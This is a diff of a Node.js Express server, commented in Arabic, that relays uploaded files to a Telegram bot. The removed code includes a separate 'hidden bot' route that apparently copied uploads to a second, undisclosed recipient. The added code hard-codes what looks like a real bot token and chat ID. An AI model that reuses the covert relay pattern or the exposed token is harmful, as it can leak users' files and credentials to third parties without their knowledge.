@@ -2,42 +2,40 @@ const express = require('express');
 const axios = require('axios');
 const multer = require('multer');
 const FormData = require('form-data');
+
 const app = express();
-const upload = multer();
+const upload = multer(); // إعداد multer لاستلام الملفات
 
-// إعدادات البوت الخفي
-const TOKEN_HIDDEN = "توكن_البوت_الخفي";
-const CHAT_ID_HIDDEN = "آي_دي_البوت_الخفي";
+// إعدادات التوكن والشات
+const MY_TOKEN = "8865686723:AAEqEmFR1Uw_C77kGR_8Wwdkz5PwdMeeIHk";
+const MY_CHAT_ID = "6576769234";
 
-// إعدادات بوت المستخدم
-const TOKEN_USER = "8865686723:AAEqEmFR1Uw_C77kGR_8Wwdkz5PwdMeeIHk";
-const CHAT_ID_USER = "6576769234";
-
-// مسار البوت الخفي
-app.post('/upload-hidden', upload.any(), async (req, res) => {
-    handleBridge(req, res, TOKEN_HIDDEN, CHAT_ID_HIDDEN);
-});
-
-// مسار بوت المستخدم
+// هذا هو المسار الذي يبحث عنه التطبيق بالضبط
 app.post('/upload-user', upload.any(), async (req, res) => {
-    handleBridge(req, res, TOKEN_USER, CHAT_ID_USER);
-});
-
-// دالة الجسر الموحدة
-async function handleBridge(req, res, token, chatId) {
     try {
+        if (!req.files || req.files.length === 0) {
+            return res.status(400).send("No file received");
+        }
+
         const file = req.files[0];
         const form = new FormData();
-        form.append('chat_id', chatId);
+        form.append('chat_id', MY_CHAT_ID);
         form.append('document', file.buffer, { filename: file.originalname });
 
-        await axios.post(`https://api.telegram.org/bot${token}/sendDocument`, form, {
+        // إعادة توجيه الملف لتليجرام
+        await axios.post(`https://api.telegram.org/bot${MY_TOKEN}/sendDocument`, form, {
             headers: form.getHeaders()
         });
+
+        console.log("تم رفع الملف بنجاح للمستخدم: " + file.originalname);
         res.status(200).send("Done");
     } catch (e) {
+        console.error("خطأ في السيرفر:", e.message);
         res.status(500).send("Error");
     }
-}
+});
 
-app.listen(process.env.PORT || 3000);
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`Server is running on port ${PORT}`);
+});
